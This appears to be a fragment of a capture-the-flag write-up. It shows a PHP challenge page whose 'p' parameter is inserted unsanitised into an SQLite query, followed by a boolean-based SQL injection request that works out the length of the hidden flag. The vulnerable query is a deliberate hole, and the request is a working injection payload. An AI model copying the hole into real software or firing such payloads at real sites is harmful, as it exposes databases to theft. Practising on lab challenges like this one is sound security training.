```php
<?php
ini_set("error_reporting", 0);
ini_set("display_errors",0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$db = new SQLite3('/tmp/db.db');
try {
  $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Flag', '" . base64_encode($FLAG) . "')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} catch(Exception $e) {
  //var_dump($e);
}


if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
  [$min, $max] = explode(",",$_GET['p']);
  if(intval($min) <= 1 ) {
    die("This post is not accessible...");
  }
  try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
      echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"<br>";
    }
  }catch(Exception $e) {
    echo "Try harder!";
  }
} else {
    echo "Try harder!";
}
?>
```

This payload didn't return error, indicating that the content of the flag is 52 chars long
```
GET /?p=2,10+AND+(SELECT+length(content)+FROM+pages+WHERE+title='Flag')=52
```
